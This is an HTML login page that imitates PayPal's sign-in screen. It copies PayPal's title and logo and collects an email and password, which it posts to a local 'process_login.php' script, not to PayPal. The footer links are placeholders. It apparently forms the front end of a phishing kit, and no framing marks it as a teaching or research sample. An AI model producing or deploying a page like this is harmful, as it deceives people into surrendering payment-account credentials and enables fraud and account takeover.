<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to your PayPal account</title>
    <link rel="stylesheet" href="../css/paypal_login.css">
    <link rel="icon" type="image/jpeg" href="../logo/paypal-3384015_1280.png">
</head>
<body>
    <div class="form">
        <img src="../logo/Paypal-Logo.png" alt="PayPal Logo" class="logo">
        <form action="process_login.php" method="post">
            <div class="input-container">
                <input type="email" id="email" name="email" required>
                <label for="email">Email or mobile number <span class="required"></span></label>
            </div>
            <div class="input-container">
                <input type="password" id="password" name="password" required>
                <label for="password">Enter your password <span class="required"></span></label>
            </div>
            <div class="forgot-password"><b>Forgot password?</b></div>
            <button type="submit" class="btn-login">Log In</button>
            <div class="divider">or</div>
            <button type="button" class="btn-signup">Sign Up</button>
        </form>
        <div class="language-selector">
            <select id="country-flag" class="language-dropdown">
                <option value="">🌍</option>
            </select>
            <span class="language-label">Select Country</span>
        </div>
    </div>
    <footer class="footer">
        <div class="footer-container">
            <a href="#" class="footer-link">Contact Us</a>
            <a href="#" class="footer-link">Privacy</a>
            <a href="#" class="footer-link">Legal</a>
            <a href="#" class="footer-link">Policy Updates</a>
            <a href="#" class="footer-link">Worldwide</a>
        </div>
    </footer>
    <script src="../javascript/paypal_login.js"></script>
</body>
</html>